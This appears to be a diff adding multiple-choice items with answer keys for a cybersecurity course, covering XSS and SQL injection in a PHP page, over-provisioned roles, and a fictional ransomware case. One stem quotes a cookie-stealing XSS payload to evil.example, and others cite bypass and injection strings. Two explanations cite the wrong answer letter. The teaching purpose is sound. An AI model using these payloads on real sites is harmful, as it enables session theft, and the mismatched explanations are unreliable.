+      <stem>The first WAF alert (2024-03-10) shows payload q=&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;. Referencing Line 9 of the code in C1, which vulnerability enables this attack and what is its name?</stem>
+      <choices>
+        <choice key="A">Reflected Cross-Site Scripting (XSS) - Line 9 echoes the raw unsanitized $query value directly into the HTML response, so any JavaScript the attacker places in the query parameter is reflected back and executed in the victim's browser, enabling session cookie theft.</choice>
+        <choice key="B">SQL injection - the attacker is inserting SQL commands into the search field to extract the database contents.</choice>
+        <choice key="C">Server-Side Request Forgery (SSRF) - the script tag causes the server to make outbound requests to evil.example on the attacker's behalf.</choice>
+        <choice key="D">Path traversal - the script tag contains a URL path that the server follows to access unauthorized resources.</choice>
+      </choices>
+      <answer key="A"/>
+      <explanation>Reflected XSS occurs when user-supplied input is included in an HTML response without sanitization. Line 9 (echo $query) writes the raw GET parameter value directly into the page HTML. When a victim visits the crafted URL, the browser receives the page with the injected script tag and executes it - stealing the victim's session cookie and sending it to the attacker's server. The attacker typically delivers this URL to victims via phishing links. The script does not run on the server; it runs in the victim's browser in the context of the NovaStar portal domain, giving it access to that domain's cookies and session data.</explanation>
+      <distractor_rationale>
+        <choice key="B">The &lt;script&gt; payload contains JavaScript, not SQL. The UNION SELECT payload in the third WAF alert is SQL injection - these are two separate vulnerabilities both enabled by the same unvalidated input on Line 3.</choice>
+        <choice key="C">SSRF causes the server to make requests to attacker-specified targets. In reflected XSS, the server echoes the script into the HTML response - the subsequent HTTP request to evil.example is made by the victim's browser, not the server. The distinction matters: SSRF exploits server-side request handling; XSS exploits client-side script execution.</choice>
+        <choice key="D">Path traversal uses directory separator sequences to access filesystem paths. The URL in the payload is a destination for stolen cookies delivered via JavaScript running in the victim's browser - not a filesystem path the server follows.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S03-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S03</stimulus_ref>
+        <topic_refs>5.1</topic_refs><lo_refs>LO 5.1.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.1.B" weight="0.72"/>
+        <secondary skill="3.B" lo="LO 5.1.A" weight="0.28"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.50</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.1</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The code on Line 5 concatenates $query directly into a SQL string, and Line 9 echoes $query directly into HTML. Explain why both vulnerabilities share the same root cause despite producing different attack types.</stem>
+      <choices>
+        <choice key="A">Both vulnerabilities share the root cause of treating unsanitized user input as trusted code in a different context: Line 5 trusts user input as safe SQL syntax (enabling SQL injection) and Line 9 trusts user input as safe HTML (enabling XSS). The common principle violated is "never trust user input" - all data from external sources must be validated, encoded, or parameterized before being used in any code context (SQL, HTML, JavaScript, shell commands).</choice>
+        <choice key="B">Both vulnerabilities are caused by using PHP instead of a safer language - switching to Python or Node.js would prevent both attacks.</choice>
+        <choice key="C">Both vulnerabilities are caused by using GET instead of POST for the search query - POST parameters are transmitted securely and cannot be injected into SQL or HTML.</choice>
+        <choice key="D">Both vulnerabilities are caused by the lack of HTTPS - if the connection were encrypted, attackers could not intercept or modify the query parameter.</choice>
+      </choices>
+      <answer key="A"/>
+      <explanation>The root cause of both SQL injection and XSS is treating external input as trusted code in an interpreter context. When a programming language or protocol interprets strings, it needs to distinguish between data and instructions. Line 5 inserts user input into a SQL interpreter context - the database executes it as SQL code. Line 9 inserts user input into an HTML interpreter context - the browser executes it as HTML/JavaScript. The solution in both cases is context-appropriate encoding or separation: parameterized queries for SQL (separating code from data at the protocol level) and HTML entity encoding for output (converting &lt; to &amp;lt; so the browser renders it as text rather than a tag). This principle applies to all injection vulnerabilities including shell injection, LDAP injection, and XML injection.</explanation>
+      <distractor_rationale>
+        <choice key="B">The language is not the root cause - SQL injection and XSS vulnerabilities occur in Python, Node.js, Java, Ruby, and every other web development language when developers concatenate user input into SQL or HTML. The vulnerability is in the code pattern, not the language.</choice>
+        <choice key="C">GET vs POST is not relevant to injection vulnerabilities. POST parameters are equally injectable - they are transmitted in the request body but are equally accessible to the server. HTTPS encrypts data in transit but has no effect on how the server processes that data after decryption.</choice>
+        <choice key="D">HTTPS encrypts the channel between client and server, preventing interception. It does not sanitize or validate the content of what is transmitted. An attacker can send SQL injection and XSS payloads over HTTPS just as effectively as over HTTP.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S03-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S03</stimulus_ref>
+        <topic_refs>5.1 5.2</topic_refs><lo_refs>LO 5.1.C LO 5.2.A</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.B" lo="LO 5.1.C" weight="0.65"/>
+        <secondary skill="2.A" lo="LO 5.2.A" weight="0.35"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.85</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>100</est_response_time_sec>
+        <prerequisite_topics>5.1 5.2</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The WAF detected the XSS payload on 2024-03-10 but did not block it (the log shows detection only). An administrator argues: "The WAF will catch XSS - we don't need to fix the code." Analyze why this argument is insufficient for a production student portal handling session cookies.</stem>
+      <choices>
+        <choice key="A">The administrator is correct - WAF detection is equivalent to blocking since the WAF alerts the security team who can then manually block each attacker IP within minutes.</choice>
+        <choice key="B">WAF detection is sufficient because session cookie theft through XSS requires the attacker to be on the same network as the victim, which the WAF prevents.</choice>
+        <choice key="C">The WAF argument is valid but only for external traffic - internally authenticated students could still exploit the XSS since internal traffic may bypass the WAF.</choice>
+        <choice key="D">WAF rules for XSS use pattern matching against known signatures - they are bypassed by encoding variations (URL encoding, Unicode, HTML entity mixing), novel payload structures, or context-aware obfuscation. A WAF in detection-only mode produces no protection at all. Even blocking WAFs miss zero-day XSS techniques. Code-level output encoding (htmlspecialchars() in PHP) is context-aware and eliminates the vulnerability regardless of payload variation - unlike pattern-matching WAF rules that can be bypassed.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>WAF pattern matching is inherently bypassable for XSS: the payload &lt;img src=x onerror=...&gt; (second WAF alert) is a common bypass of simple &lt;script&gt; tag filters; attackers can further obfuscate with HTML entities, Unicode escapes, JavaScript template literals, and CSS expression injection. A WAF in detection-only mode (as shown - all three payloads received HTTP 200 responses) provides zero protection. Even in blocking mode, WAFs are a defense-in-depth layer, not a substitute for secure code. PHP's htmlspecialchars($query, ENT_QUOTES) on Line 9 converts all HTML metacharacters to entities - &lt; becomes &amp;lt; - making script tag injection structurally impossible regardless of payload creativity, because the browser never receives interpretable HTML from user input.</explanation>
+      <distractor_rationale>
+        <choice key="A">Manual IP blocking after WAF alerts has several gaps: the attacker may rotate IPs, the alert-to-block latency (even minutes) allows successful exploitation, and detection-only mode (as shown here) generates alerts without any automated blocking action.</choice>
+        <choice key="B">XSS-based session cookie theft does not require network adjacency. The attacker delivers the crafted URL (e.g., via email or chat), the victim loads it from anywhere on the internet, and the injected script sends the cookie to evil.example over HTTPS - no network-layer interception required.</choice>
+        <choice key="C">XSS exploits execute in any victim's browser that loads the crafted URL, regardless of whether the victim is internal or external. Session cookies are accessible to JavaScript running in the browser context regardless of network position. Authenticated internal students are high-value targets for session cookie theft.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S03-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S03</stimulus_ref>
+        <topic_refs>5.1 5.2</topic_refs><lo_refs>LO 5.1.C LO 5.2.A LO 5.2.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="2.A" lo="LO 5.1.C" weight="0.55"/>
+        <secondary skill="3.B" lo="LO 5.2.A" weight="0.45"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.44</b_param><a_param>1.58</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>162</est_response_time_sec>
+        <prerequisite_topics>5.1 5.2</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>The development team must remediate search.php to fix both the SQLi (Line 5) and the XSS (Line 9) vulnerabilities. Which code remediation correctly addresses both vulnerabilities with the minimum necessary changes?</stem>
+      <choices>
+        <choice key="A">Add input length validation: if(strlen($query) &gt; 100) die("Input too long"); This prevents both SQL injection and XSS by limiting payload size.</choice>
+        <choice key="B">Require users to log in before accessing search.php - authentication prevents anonymous attackers from reaching the vulnerable endpoint.</choice>
+        <choice key="C">Add a blacklist filter: $query = str_replace(["'", "&lt;", "&gt;", "script"], "", $query); This strips all SQL and XSS metacharacters before use.</choice>
+        <choice key="D">Line 5: replace string concatenation with a prepared statement using a parameterized query (PDO or mysqli with bind_param), so $query is passed as a data parameter not SQL syntax. Line 9: replace echo $query with echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8'), so $query is HTML-entity-encoded before output and never interpreted as HTML by the browser.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>B applies the correct context-appropriate encoding for each vulnerability: (1) PDO/mysqli prepared statements for SQL - the parameter placeholder (?) separates SQL syntax from data at the protocol level; the database driver handles escaping for the specific database dialect, making injection structurally impossible; (2) htmlspecialchars() for HTML output - converts &lt; to &amp;lt;, &gt; to &amp;gt;, ' to &amp;#039;, and &amp; to &amp;amp; using ENT_QUOTES, ensuring all HTML metacharacters are rendered as text rather than interpreted as markup or script. These two changes are minimal, correct, and address the root cause of each vulnerability independently.</explanation>
+      <distractor_rationale>
+        <choice key="A">Length validation does not prevent SQL injection or XSS - both attacks can be executed with short payloads well under 100 characters (e.g., q=' OR 1=1-- is 13 characters). Length validation is useful for business logic validation, not injection prevention.</choice>
+        <choice key="B">Authentication reduces the anonymous attack surface but does not fix the vulnerability. Authenticated users (students, teachers) could still exploit the SQLi to extract other students' data or the XSS to steal other users' session cookies. Authentication and input validation are complementary controls addressing different threats.</choice>
+        <choice key="C">Blacklist filtering is brittle and bypassable: SQL injection can use hex encoding, comment variations, and whitespace substitution; XSS can use &lt;img&gt; tags, event handlers, JavaScript URI schemes, and Unicode encoding - none of which require the specific strings in the blacklist. Blacklists fail against novel payloads; allowlists or context-appropriate encoding succeed against all payloads.</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+
+<!-- S04 - Access Control Matrix (Over-Provisioned Roles)
+     Topics: 5.2 | Skills: 1.A 1.C 1.D 2.A -->
+<stimulus_set id="U5-S04" difficulty_range="1-3">
+  <stimulus>
+    <type>access_control_matrix</type>
+    <label>Exhibit D - Role Permission Matrix: Vantara USD Student Information System</label>
+    <context>During a routine access review, Vantara USD's IT security team produced the following permission matrix for the Student Information System (SIS). The review was triggered after a teacher inadvertently accessed and modified a student's financial aid record.</context>
+    <artifact format="log_file">
+      <log_type>SIS Role Permission Matrix - Current Configuration</log_type>
+      <entries>
+PERMISSION                        STUDENT  TEACHER  DEPT_ADMIN  REGISTRAR  IT_ADMIN
+--------------------------------- -------- -------- ----------- ---------- --------
+View own academic records         YES      YES      YES         YES        YES
+View all student academic records NO       YES      YES         YES        YES
+Edit own academic records         NO       NO       NO          NO         NO
+Edit ANY student academic record  NO       YES      YES         YES        YES  [!]
+View own financial aid records    YES      NO       NO          YES        NO
+View ALL student financial aid    NO       YES      YES         YES        NO   [!]
+Edit ANY financial aid record     NO       YES      NO          YES        NO   [!]
+Delete student records            NO       NO       YES         NO         YES
+Access SIS admin console          NO       NO       YES         NO         YES
+Export full SIS database          NO       NO       YES         YES        YES  [!]
+      </entries>
+      <note>[!] = permissions flagged as potentially over-provisioned by the review team.
+The teacher involved in the triggering incident accessed the SIS through their normal login.
+No security controls prevented the access - the permission was granted by the matrix above.</note>
+    </artifact>
+    <provenance>Fictional. All permissions and roles are invented for assessment purposes.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S04-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S04</stimulus_ref>
+        <topic_refs>5.2</topic_refs><lo_refs>LO 5.2.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.2.A" weight="1.0"/></skill_vector>
+      <adaptive_meta><b_param>-0.32</b_param><a_param>0.90</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>52</est_response_time_sec>
+        <prerequisite_topics>5.2</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The matrix shows TEACHER role has "Edit ANY student academic record: YES" and "View ALL student financial aid: YES." The triggering incident involved a teacher inadvertently accessing a student's financial aid record. Which access control principle does the teacher's permission set most directly violate?</stem>
+      <choices>
+        <choice key="A">Least privilege - users should be granted only the minimum permissions necessary to perform their specific job functions. A teacher's function is to instruct students and record grades, not to view or edit all financial aid records across the entire student population.</choice>
+        <choice key="B">Separation of duties - teachers should not be able to perform tasks also performed by the registrar.</choice>
+        <choice key="C">Need-to-know - the teacher did not need to know the student's financial aid status to complete any specific assigned task.</choice>
+        <choice key="D">Accountability - the teacher's access was not logged, making the incident impossible to investigate.</choice>
+      </choices>
+      <answer key="A"/>
+      <explanation>Least privilege (also called principle of minimal access) requires that every user, process, and system component be granted only the minimum permissions required to perform its designated function. A teacher's designated function is instruction, grading, and academic record maintenance for their own students. Broad permissions to edit ANY student's academic records (including students not in their classes) and view all financial aid records across the institution exceed any reasonable minimum for the teacher role. The triggering incident was not a security breach - it was a predictable consequence of over-provisioning: the teacher's legitimate credentials gave them access they should not have had by design.</explanation>
+      <distractor_rationale>
+        <choice key="B">Separation of duties prevents any single person from having conflicting privileges that enable fraud (e.g., creating and approving the same financial transaction). The issue here is over-provisioning within the teacher role, not conflict between teacher and registrar functions.</choice>
+        <choice key="C">Need-to-know is closely related to least privilege but specifically applies to classified or sensitive information contexts. The broader principle violated here is least privilege, which governs all access permissions not just classified information access.</choice>
+        <choice key="D">The note states "No security controls prevented the access" - the permission was explicitly granted. This is a configuration issue, not a logging gap. The incident is investigatable through standard access logs even if the note does not mention them explicitly.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S04-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S04</stimulus_ref>
+        <topic_refs>5.2</topic_refs><lo_refs>LO 5.2.A LO 5.2.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.2.B" weight="0.72"/>
+        <secondary skill="1.A" lo="LO 5.2.A" weight="0.28"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.48</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.2</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The matrix shows IT_ADMIN role has "Export full SIS database: YES" alongside "Delete student records: YES." Explain why combining these two permissions in a single role creates a risk beyond what either permission creates individually.</stem>
+      <choices>
+        <choice key="A">Export and delete together enable a complete data theft-and-cover-up attack vector: an IT_ADMIN with both permissions can export the full student database (exfiltrate all PII, financial aid records, academic data) then delete the records - potentially destroying the evidence of the exfiltration and leaving no recoverable copy in the system. This violates separation of duties: data export and record deletion should require different roles so no single individual can both steal and destroy the data.</choice>
+        <choice key="B">Combining export and delete in one role is standard practice for IT administrators who need to perform database maintenance tasks - this combination creates no additional risk.</choice>
+        <choice key="C">The risk is only elevated if the IT_ADMIN also has Edit permissions, which they do not have according to the matrix.</choice>
+        <choice key="D">The combination is risky only for external contractors - full-time IT administrators can be trusted with both permissions based on their employment background checks.</choice>
+      </choices>
+      <answer key="A"/>
+      <explanation>Separation of duties prevents high-risk combined capabilities that enable undetectable fraud or harm. Export alone creates exfiltration risk but the database remains intact for forensic investigation. Delete alone creates destruction risk but no data theft. Export + Delete together create a scenario where a single malicious or coerced insider can steal all student PII and then destroy evidence of the theft and the records themselves. The control: separate these permissions across roles requiring two people to collaborate (one exports, another deletes), making the combined attack require insider collusion rather than a single compromised account. Backup and immutable audit logs also compensate, but the least-privilege principle argues against the combination in the first place.</explanation>
+      <distractor_rationale>
+        <choice key="B">Database maintenance tasks (backup, schema changes, performance tuning) do not require production record deletion. Delete permissions are rare legitimate requirements for IT administrators in systems with proper data lifecycle management and archival processes.</choice>
+        <choice key="C">Edit permissions are a separate concern. Export + Delete is already a dangerous combination independent of edit access: reading sensitive data and then destroying records is a complete insider threat attack vector without requiring the ability to modify records.</choice>
+        <choice key="D">Employment background checks mitigate risk of hiring with malicious intent but do not address insider threat from compromised accounts, social engineering, financial coercion, or behavioral change over time. Access control must be designed to limit harm from any insider regardless of their initial trustworthiness at hiring.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S04-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S04</stimulus_ref>
+        <topic_refs>5.2</topic_refs><lo_refs>LO 5.2.A LO 5.2.C</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.D" lo="LO 5.2.C" weight="0.65"/>
+        <secondary skill="2.A" lo="LO 5.2.A" weight="0.35"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.82</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>100</est_response_time_sec>
+        <prerequisite_topics>5.2</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The review team must propose a revised TEACHER role permission set that satisfies least privilege for a teacher's core job functions. Which revised permission set is most appropriate?</stem>
+      <choices>
+        <choice key="A">TEACHER: View ALL student academic records (read-only), View ALL financial aid records (read-only to understand student context), No edit permissions on any records outside their gradebook, No database export, No admin console - read-only access reflects the reality that teachers need broad context.</choice>
+        <choice key="B">TEACHER: View own academic records, View ALL student academic records, Edit grades for OWN students only, No financial aid access, No database export, No admin console.</choice>
+        <choice key="C">TEACHER: Remove all current permissions and require teachers to submit IT tickets for any record access, reviewed and approved by DEPT_ADMIN before each access.</choice>
+        <choice key="D">TEACHER: Keep all current permissions but add a mandatory confirmation prompt before accessing financial aid records, to ensure teachers are aware of what they are accessing.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>A correctly applies least privilege to the teacher role: (1) View ALL student academic records is reasonable - teachers need to see academic performance across their classes, including records from prior semesters; (2) Edit grades for OWN students only - the core teacher function, scoped to their assignment; (3) No financial aid access - financial aid is a registrar/financial office function; teachers have no job function requiring financial aid visibility; (4) No database export or admin console - maintenance and bulk data operations are IT/registrar functions. This set removes the four flagged over-provisioned permissions while preserving legitimate job function access.</explanation>
+      <distractor_rationale>
+        <choice key="A">Read-only access to ALL financial aid records for all students still violates least privilege - "understanding student context" is too vague a justification for broad financial PII access. Teachers who need to know a specific student's financial situation (e.g., for accommodation discussions) should request access through a defined channel, not have system-wide read access to all aid records.</choice>
+        <choice key="C">Requiring IT tickets for every record access creates impractical operational overhead for teachers who need to access grade records multiple times daily. Least privilege should constrain excessive access, not eliminate legitimate routine access that is required for the core job function.</choice>
+        <choice key="D">Confirmation prompts are awareness controls, not access controls. A prompt does not prevent access - it only asks the user to confirm. The triggering incident shows a teacher "inadvertently" accessed a financial aid record; a prompt would not prevent deliberate access and may not prevent inadvertent access if the teacher clicks through the prompt without reading it.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S04-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S04</stimulus_ref>
+        <topic_refs>5.2</topic_refs><lo_refs>LO 5.2.A LO 5.2.B LO 5.2.C</lo_refs></meta>
+      <skill_vector>
+        <primary skill="2.A" lo="LO 5.2.C" weight="0.55"/>
+        <secondary skill="1.D" lo="LO 5.2.B" weight="0.45"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.45</b_param><a_param>1.60</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>165</est_response_time_sec>
+        <prerequisite_topics>5.2</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>The matrix shows REGISTRAR role has "Export full SIS database: YES." The IT team argues this is necessary because registrars need to submit data to the state education department annually. Evaluate this justification using least privilege, and propose a more precisely scoped alternative.</stem>
+      <choices>
+        <choice key="A">The justification is valid - if registrars need to export data for state reporting, full database export access is the minimum necessary permission for that function.</choice>
+        <choice key="B">Full database export is the least-privilege solution because partial exports require custom SQL queries that are technically complex and create additional injection risk.</choice>
+        <choice key="C">The justification is invalid - registrars should never have any export capability since data exports are an IT function only.</choice>
+        <choice key="D">The justification identifies a legitimate need (state reporting) but conflates "export state-required fields for enrolled students" with "export full SIS database." Full database export includes financial aid details, IT configuration tables, internal notes, disciplinary records, and data categories not relevant to state enrollment reporting. A precisely scoped alternative: create a dedicated "State Reporting Export" role or function that generates a pre-defined report containing only the fields required by the state data format, and assign registrars only this scoped export capability rather than full database access.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>Least privilege requires scoping access to the minimum necessary for the specific task, not the broadest access that enables the task. "State reporting export" is a defined subset of SIS data: typically enrolled student names, IDs, grades, demographic fields, and attendance - not financial aid details, IT system tables, or internal notes. Creating a dedicated reporting function (a pre-defined report or restricted export role) that produces exactly the state-required format satisfies the legitimate business need while limiting the registrar's ability to export data categories outside the state reporting scope. This is a common pattern: least-privilege access is often implemented by creating purpose-built functions rather than granting broad access to general tools.</explanation>
+      <distractor_rationale>
+        <choice key="A">Full database export is not the minimum necessary - it is the broadest possible export permission. The minimum necessary for state enrollment reporting is a scoped export of the specific fields required by the state data submission format. "Minimum necessary" requires analyzing what the task actually requires, not defaulting to the most general permission that enables it.</choice>
+        <choice key="B">Pre-defined report exports (purpose-built UI or API endpoints) do not require custom SQL queries from the registrar - the IT team builds the report once and the registrar runs it as a button click. The complexity argument mischaracterizes how purpose-built reporting functions work.</choice>
+        <choice key="C">Registrars do have legitimate data export needs - state reporting is a core registrar function. Removing all export capability prevents the function from being performed. Least privilege means scoping access appropriately, not eliminating it.</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+<!-- S05 - Ransomware Incident (Newspaper Clipping)
+     Topics: 5.5, 5.6 | Skills: 1.A 1.C 3.B 3.A -->
+<stimulus_set id="U5-S05" difficulty_range="1-3">
+  <stimulus>
+    <type>news_clipping</type>
+    <label>Exhibit E - News Article: Meridian Health Data Breach and Ransomware Event</label>
+    <context>The following article was published in a regional health technology news outlet. NovaStar Tech's CISO used it as a case study in a board presentation on data protection investment.</context>
+    <artifact format="clipping">
+      <source>HealthTech Security Report</source>
+      <date>February 28, 20XX</date>
+      <headline>Meridian Health Suffers Ransomware Attack; 340,000 Patient Records Exposed</headline>
+      <body>
+Meridian Health confirmed last week that a ransomware attack in January compromised its
+electronic health records system, resulting in the exposure of approximately 340,000 patient
+records including names, dates of birth, Social Security numbers, diagnosis codes, and
+insurance information.
+
+The attackers, identified by researchers as the LockBit 3.0 affiliate group, gained initial
+access through a phishing email targeting an administrative assistant. They spent an estimated
+22 days in the network before deploying the ransomware payload, during which time they
+exfiltrated patient data to an external server.
+
+Investigation findings revealed:
+  - Patient records were stored in a flat database without field-level encryption
+  - Backups existed but had not been tested since 2021, two failed to restore during recovery
+  - No data classification policy existed; all data was treated with uniform (low) protection
+  - The EHR vendor had issued a patch for a known vulnerability 6 months prior; it was unapplied
+  - The organization did not have cyber insurance at the time of the attack
+
+Meridian Health faces potential HIPAA fines of up to $1.9 million and a class-action lawsuit
+from affected patients. Recovery costs are estimated at $4.2 million. The organization was
+offline for 11 days, during which patient appointments were canceled and paper records used.
+
+Security experts recommend field-level encryption of sensitive health data, regular tested
+backups, data classification policies, and rapid vulnerability patching as foundational controls.
+      </body>
+    </artifact>
+    <provenance>Fictional article. All organizations, statistics, and events are invented.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S05-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S05</stimulus_ref>
+        <topic_refs>5.5</topic_refs><lo_refs>LO 5.5.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.5.A" weight="1.0"/></skill_vector>
+      <adaptive_meta><b_param>-0.35</b_param><a_param>0.90</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>52</est_response_time_sec>
+        <prerequisite_topics>5.5</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The article states patient records were stored "in a flat database without field-level encryption" and "no data classification policy existed." Which data protection principle does the absence of a classification policy most directly prevent an organization from implementing?</stem>
+      <choices>
+        <choice key="A">Availability, without classification, administrators cannot ensure high-availability systems are provisioned for the most critical data.</choice>
+        <choice key="B">Risk-proportionate protection, data classification assigns sensitivity levels (e.g., public, internal, confidential, restricted/PHI) so that appropriate controls (encryption, access limits, retention rules, audit logging) are applied proportional to sensitivity. Without classification, an organization cannot systematically identify which data needs the strongest controls, leading to uniform under-protection of highly sensitive data.</choice>
+        <choice key="C">Non-repudiation, without classification labels, audit trails cannot attribute data access to specific individuals.</choice>
+        <choice key="D">Integrity, unclassified data is more susceptible to unauthorized modification because access controls cannot be applied.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>Data classification is the foundational step that enables risk-proportionate controls. Without it, the organization cannot systematically answer "which data needs encryption?", "which data needs stricter access controls?", or "which data must be retained for how long?" Meridian's patient records, containing SSNs, diagnoses, and insurance data, are clearly PHI under HIPAA and warrant the strongest protection tier. The article's finding that "all data was treated with uniform (low) protection" is the direct consequence of absent classification: without labels differentiating PHI from administrative emails, all data defaults to the lowest common protection level the organization applies.</explanation>
+      <distractor_rationale>
+        <choice key="A">Availability is about uptime and recovery, addressed through redundancy and backups. Classification informs which data needs the highest availability tier, but availability as a control is implemented through infrastructure, not classification labels alone.</choice>
+        <choice key="C">Non-repudiation requires audit logging that records who accessed what and when. Classification informs which data access events should be logged, but non-repudiation is implemented through audit controls, not classification labels themselves.</choice>
+        <choice key="D">Integrity controls (checksums, write-once storage, access restrictions) prevent unauthorized modification. Classification informs which data needs the strongest integrity controls, but integrity as a property is maintained through separate technical controls, not classification labeling alone.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S05-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S05</stimulus_ref>
+        <topic_refs>5.5 5.6</topic_refs><lo_refs>LO 5.5.B LO 5.6.A</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.6.A" weight="0.70"/>
+        <secondary skill="3.B" lo="LO 5.5.B" weight="0.30"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.48</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.5 5.6</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The article states attackers spent 22 days in the network before deploying ransomware, during which they exfiltrated patient data. This pre-deployment period is called "dwell time." Explain why extended dwell time before ransomware deployment is more damaging than an immediate ransomware execution upon initial access.</stem>
+      <choices>
+        <choice key="A">Extended dwell time is less damaging because the ransomware has not yet been deployed, the organization's data remains accessible and no ransom demand has been made.</choice>
+        <choice key="B">Dwell time duration has no correlation with attack severity, ransomware impact is determined only by the volume of files encrypted, not by pre-deployment reconnaissance.</choice>
+        <choice key="C">Extended dwell time allows the organization to detect the intrusion through normal monitoring before ransomware deploys, making early-stage attacks more likely to be caught and remediated without data loss.</choice>
+        <choice key="D">Extended dwell time enables data exfiltration before encryption: attackers spend the dwell period mapping the network, elevating privileges, identifying backup locations (to disable them), and copying sensitive data to external servers. When ransomware finally deploys, the organization faces dual extortion, pay the ransom to decrypt files AND pay a separate extortion demand to prevent the pre-exfiltrated patient data from being published. Immediate ransomware execution denies this reconnaissance period, preventing the exfiltration and backup sabotage that make recovery harder and regulatory consequences more severe.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>Modern ransomware attacks, particularly those by affiliate groups like LockBit, use extended dwell time for specific objectives: (1) lateral movement to maximize the number of systems encrypted when the payload deploys; (2) backup identification and deletion or encryption to prevent recovery without paying; (3) data exfiltration enabling "double extortion" (decrypt-or-we-publish threats) that created significant additional harm in Meridian's case, 340,000 patients' PHI in attackers' hands creates HIPAA liability independent of whether the ransom was paid; (4) persistence establishment ensuring re-access if the initial ransom isn't paid. The article confirms all these consequences: two backups failed (backup sabotage), data was exfiltrated, and the organization faced both recovery costs and regulatory fines from the exfiltrated PHI.</explanation>
+      <distractor_rationale>
+        <choice key="A">The absence of active ransomware during dwell time creates a false sense of security, not less damage. The dwell period is when the most damaging preparatory actions occur. By the time ransomware deploys, the real harm, data theft, backup destruction, has already been done.</choice>
+        <choice key="B">Ransomware impact correlates strongly with pre-deployment reconnaissance: the number of systems compromised (lateral movement), backup availability (backup sabotage), and regulatory consequences (data exfiltration) all depend on what attackers do during dwell time, not just on file encryption volume.</choice>
+        <choice key="C">The article's 22-day dwell time was not detected, discovery came when ransomware deployed and systems went offline. The premise that longer dwell time helps defenders assumes active monitoring capable of detecting sophisticated lateral movement, which Meridian evidently lacked.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S05-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S05</stimulus_ref>
+        <topic_refs>5.5 5.6</topic_refs><lo_refs>LO 5.5.A LO 5.6.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.B" lo="LO 5.6.B" weight="0.65"/>
+        <secondary skill="1.C" lo="LO 5.5.A" weight="0.35"/>
+      </skill_vector>
